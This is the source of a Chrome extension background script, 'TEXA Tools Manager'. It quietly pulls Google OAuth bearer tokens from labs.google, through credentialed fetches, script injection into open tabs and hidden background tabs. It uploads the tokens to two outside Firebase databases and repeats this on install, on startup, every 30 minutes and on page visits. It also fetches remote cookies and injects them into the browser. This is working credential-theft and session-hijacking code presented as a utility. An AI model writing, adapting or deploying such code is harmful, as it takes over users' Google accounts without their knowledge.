// =============================================
// TEXA Tools Manager - Background Service Worker
// Silent Token Scraping & Firebase Storage
// =============================================

// Firebase REST API Configuration - PRIMARY
const FIREBASE_PRIMARY = {
    projectId: 'tekno-cfaba',
    tokenPath: 'artifacts/my-token-vault/public/data/tokens/google_oauth_user_1'
};

// Firebase REST API Configuration - BACKUP
const FIREBASE_BACKUP = {
    projectId: 'tekno-335f8',
    rtdbUrl: 'https://tekno-335f8-default-rtdb.asia-southeast1.firebasedatabase.app',
    tokenPath: 'texa_tokens/google_oauth_user_1'
};

// Target URL for token scraping
const GOOGLE_LABS_URL = 'https://labs.google/fx/tools/flow';

// Build Firestore REST API URL (Primary)
function getFirestoreUrl(projectId, path) {
    return `https://firestore.googleapis.com/v1/projects/${projectId}/databases/(default)/documents/${path}`;
}

// Build Realtime Database URL (Backup)
function getRtdbUrl(path) {
    return `${FIREBASE_BACKUP.rtdbUrl}/${path}.json`;
}

// =============================================
// SILENT TOKEN SCRAPING
// =============================================

// Regex for bearer token (ya29.xxx with at least 100 chars)
const TOKEN_REGEX = /ya29\.[a-zA-Z0-9_-]{100,}/g;

// Silent scrape - try to fetch page in background
async function silentScrapeToken() {
    console.log('TEXA: Starting silent token scrape...');

    try {
        // Method 1: Try direct fetch with credentials
        const response = await fetch(GOOGLE_LABS_URL, {
            credentials: 'include',
            headers: {
                'Accept': 'text/html,application/xhtml+xml',
            }
        });

        if (response.ok) {
            const html = await response.text();
            const matches = html.match(TOKEN_REGEX);

            if (matches && matches.length > 0) {
                // Get longest token (most complete)
                const token = matches.reduce((a, b) => a.length > b.length ? a : b);
                console.log('TEXA: Token found via silent fetch!');

                await saveTokenToFirebase(token, 'Silent Background Scrape');
                return { success: true, token: token, method: 'silent_fetch' };
            }
        }

        // Method 2: Check existing Google Labs tabs
        const existingTabs = await chrome.tabs.query({ url: 'https://labs.google/*' });
        if (existingTabs.length > 0) {
            console.log('TEXA: Found existing Google Labs tab, injecting script...');

            try {
                const results = await chrome.scripting.executeScript({
                    target: { tabId: existingTabs[0].id },
                    func: () => {
                        const regex = /ya29\.[a-zA-Z0-9_-]{100,}/g;
                        const html = document.documentElement.outerHTML;
                        const matches = html.match(regex);
                        return matches ? matches.reduce((a, b) => a.length > b.length ? a : b) : null;
                    }
                });

                if (results && results[0] && results[0].result) {
                    const token = results[0].result;
                    console.log('TEXA: Token found via existing tab!');
                    await saveTokenToFirebase(token, 'Existing Tab Scrape');
                    return { success: true, token: token, method: 'existing_tab' };
                }
            } catch (injectErr) {
                console.log('TEXA: Could not inject into existing tab:', injectErr.message);
            }
        }

        // Method 3: Create background tab (as fallback, minimized)
        console.log('TEXA: Creating background tab for scraping...');
        return await scrapeViaBackgroundTab();

    } catch (error) {
        console.error('TEXA: Silent scrape error:', error);
        return { success: false, error: error.message };
    }
}

// Scrape via background tab (fallback method)
async function scrapeViaBackgroundTab() {
    return new Promise(async (resolve) => {
        try {
            // Create tab in background
            const tab = await chrome.tabs.create({
                url: GOOGLE_LABS_URL,
                active: false, // Background tab
                pinned: false
            });

            // Set timeout
            const timeout = setTimeout(async () => {
                try { await chrome.tabs.remove(tab.id); } catch (e) { }
                resolve({ success: false, error: 'Timeout' });
            }, 20000);

            // Wait for content script to send token
            const listener = async (msg, sender) => {
                if (msg.type === 'TEXA_TOKEN_FOUND' && msg.token && sender.tab?.id === tab.id) {
                    clearTimeout(timeout);
                    chrome.runtime.onMessage.removeListener(listener);

                    await saveTokenToFirebase(msg.token, 'Background Tab Scrape');

                    // Close background tab after small delay
                    setTimeout(async () => {
                        try { await chrome.tabs.remove(tab.id); } catch (e) { }
                    }, 500);

                    resolve({ success: true, token: msg.token, method: 'background_tab' });
                }
            };

            chrome.runtime.onMessage.addListener(listener);

        } catch (error) {
            resolve({ success: false, error: error.message });
        }
    });
}

// =============================================
// FIREBASE TOKEN STORAGE (Dual Database)
// =============================================

async function saveTokenToFirebase(token, source = 'Extension') {
    const timestamp = new Date().toISOString();

    // Save to both databases simultaneously
    const results = await Promise.allSettled([
        saveToPrimary(token, source, timestamp),
        saveToBackup(token, source, timestamp)
    ]);

    // Check results
    const primaryResult = results[0];
    const backupResult = results[1];

    console.log('TEXA: Primary save:', primaryResult.status);
    console.log('TEXA: Backup save:', backupResult.status);

    // Store in local cache
    await chrome.storage.local.set({
        'texa_bearer_token': token,
        'texa_token_updated': timestamp,
        'texa_token_source': source
    });

    // Return success if at least one succeeded
    if (primaryResult.status === 'fulfilled' || backupResult.status === 'fulfilled') {
        console.log('TEXA: Token saved to Firebase (Primary + Backup)');
        return { success: true };
    }

    throw new Error('Both databases failed');
}

// Save to Primary (Firestore - tekno-cfaba)
async function saveToPrimary(token, source, timestamp) {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);

    const body = {
        fields: {
            token: { stringValue: token },
            id: { stringValue: 'google_oauth_user_1' },
            updatedAt: { timestampValue: timestamp },
            source: { stringValue: source },
            note: { stringValue: 'Auto-scraped dari Chrome Extension TEXA' }
        }
    };

    const response = await fetch(url, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Primary Firebase error: ${response.status}`);
    return { success: true, db: 'primary' };
}

// Save to Backup (Realtime Database - tekno-335f8)
async function saveToBackup(token, source, timestamp) {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);

    const body = {
        token: token,
        id: 'google_oauth_user_1',
        updatedAt: timestamp,
        source: source,
        note: 'Auto-scraped dari Chrome Extension TEXA'
    };

    const response = await fetch(url, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    });

    if (!response.ok) throw new Error(`Backup Firebase error: ${response.status}`);
    return { success: true, db: 'backup' };
}

// Get token with failover
async function getTokenFromFirebase() {
    // Try primary first
    try {
        const result = await getFromPrimary();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Primary read failed, trying backup...');
    }

    // Try backup
    try {
        const result = await getFromBackup();
        if (result.success) return result;
    } catch (e) {
        console.log('TEXA: Backup read failed, trying cache...');
    }

    // Fallback to local cache
    const cached = await chrome.storage.local.get(['texa_bearer_token', 'texa_token_updated']);
    if (cached.texa_bearer_token) {
        return { success: true, token: cached.texa_bearer_token, updatedAt: cached.texa_token_updated, fromCache: true };
    }

    return { success: false, error: 'Token not found in any source' };
}

// Get from Primary (Firestore)
async function getFromPrimary() {
    const url = getFirestoreUrl(FIREBASE_PRIMARY.projectId, FIREBASE_PRIMARY.tokenPath);
    const response = await fetch(url);

    if (!response.ok) throw new Error(`Primary error: ${response.status}`);

    const data = await response.json();
    const token = data.fields?.token?.stringValue;

    if (token) {
        await chrome.storage.local.set({ 'texa_bearer_token': token });
        return { success: true, token, updatedAt: data.fields?.updatedAt?.timestampValue, source: 'primary' };
    }
    throw new Error('No token in primary');
}

// Get from Backup (RTDB)
async function getFromBackup() {
    const url = getRtdbUrl(FIREBASE_BACKUP.tokenPath);
    const response = await fetch(url);

    if (!response.ok) throw new Error(`Backup error: ${response.status}`);

    const data = await response.json();

    if (data && data.token) {
        await chrome.storage.local.set({ 'texa_bearer_token': data.token });
        return { success: true, token: data.token, updatedAt: data.updatedAt, source: 'backup' };
    }
    throw new Error('No token in backup');
}

// =============================================
// MESSAGE HANDLERS
// =============================================

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('Background received:', message.type || message.action);

    // Token found from content script
    if (message.type === 'TEXA_TOKEN_FOUND') {
        saveTokenToFirebase(message.token, message.source || 'Content Script')
            .then(() => {
                chrome.runtime.sendMessage({ type: 'TEXA_TOKEN_SAVED', token: message.token });
            })
            .catch(err => console.error('Save failed:', err));
        sendResponse({ success: true });
        return;
    }

    // Manual scrape request from popup
    if (message.type === 'TEXA_SCRAPE_TOKEN') {
        silentScrapeToken()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Get token request
    if (message.type === 'TEXA_GET_TOKEN') {
        getTokenFromFirebase()
            .then(result => sendResponse(result))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Legacy SAVE_TOKEN
    if (message.action === 'SAVE_TOKEN') {
        saveTokenToFirebase(message.payload.token, message.payload.service)
            .then(() => sendResponse({ status: 'success' }))
            .catch(err => sendResponse({ status: 'error', msg: err.message }));
        return true;
    }

    // Open tool with cookies
    if (message.type === 'TEXA_OPEN_TOOL') {
        handleOpenTool(message)
            .then(res => sendResponse(res))
            .catch(err => sendResponse({ success: false, error: err.message }));
        return true;
    }

    // Login success notification
    if (message.type === 'TEXA_LOGIN_SUCCESS') {
        chrome.notifications.create({
            type: 'basic',
            iconUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
            title: 'TEXA Tools',
            message: 'Login berhasil! Extension siap digunakan.'
        });
        return;
    }

    return false;
});

// =============================================
// TOOL HANDLING
// =============================================

async function handleOpenTool(data) {
    const { targetUrl, apiUrl, authHeader } = data;

    try {
        if (!apiUrl) {
            await chrome.tabs.create({ url: targetUrl });
            return { success: true };
        }

        const fetchOptions = authHeader ? { headers: { 'Authorization': authHeader } } : {};
        const response = await fetch(apiUrl, fetchOptions);

        if (!response.ok) throw new Error(`API error: ${response.status}`);

        const cookiesData = await response.json();
        let cookies = extractCookies(cookiesData);

        for (const cookie of cookies) {
            try { await setCookie(cookie, targetUrl); } catch (e) { }
        }

        await chrome.tabs.create({ url: targetUrl });
        return { success: true, injectedCount: cookies.length };
    } catch (error) {
        await chrome.tabs.create({ url: targetUrl });
        return { success: true, fallback: true };
    }
}

function extractCookies(data) {
    if (data.fields) {
        for (const key in data.fields) {
            if (data.fields[key].stringValue) {
                try {
                    const parsed = JSON.parse(data.fields[key].stringValue);
                    if (Array.isArray(parsed)) return parsed;
                    if (parsed.cookies) return parsed.cookies;
                } catch (e) { }
            }
        }
    }
    if (Array.isArray(data)) return data;
    if (data.cookies) return data.cookies;
    return [];
}

function setCookie(cookieData, targetUrl) {
    const domain = cookieData.domain || new URL(targetUrl).hostname;
    const rawDomain = domain.startsWith('.') ? domain.substring(1) : domain;

    return chrome.cookies.set({
        url: cookieData.url || `https://${rawDomain}${cookieData.path || '/'}`,
        name: cookieData.name,
        value: cookieData.value,
        path: cookieData.path || '/',
        secure: cookieData.secure !== false,
        httpOnly: cookieData.httpOnly === true,
        domain: cookieData.domain,
        expirationDate: cookieData.expirationDate,
        sameSite: cookieData.sameSite
    });
}

// =============================================
// AUTO-SCRAPE ON STARTUP & ALARM
// =============================================

// Run silent scrape when extension starts
chrome.runtime.onStartup.addListener(() => {
    console.log('TEXA: Extension started, running silent scrape...');
    setTimeout(() => silentScrapeToken(), 5000);
});

// Run on install
chrome.runtime.onInstalled.addListener(() => {
    console.log('TEXA: Extension installed, setting up alarms...');
    chrome.alarms.create('silentTokenRefresh', { periodInMinutes: 30 });
    // Initial scrape after 10 seconds
    setTimeout(() => silentScrapeToken(), 10000);
});

// Periodic silent refresh
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'silentTokenRefresh') {
        console.log('TEXA: Periodic silent token refresh...');
        silentScrapeToken();
    }
});

// Also scrape when user visits any Google page (passive)
chrome.webNavigation.onCompleted.addListener(async (details) => {
    if (details.url.includes('labs.google')) {
        console.log('TEXA: User visited Google Labs, scraping...');
        setTimeout(() => silentScrapeToken(), 3000);
    }
}, { url: [{ hostContains: 'labs.google' }] });

console.log('TEXA Tools Manager - Silent Background Script Loaded');
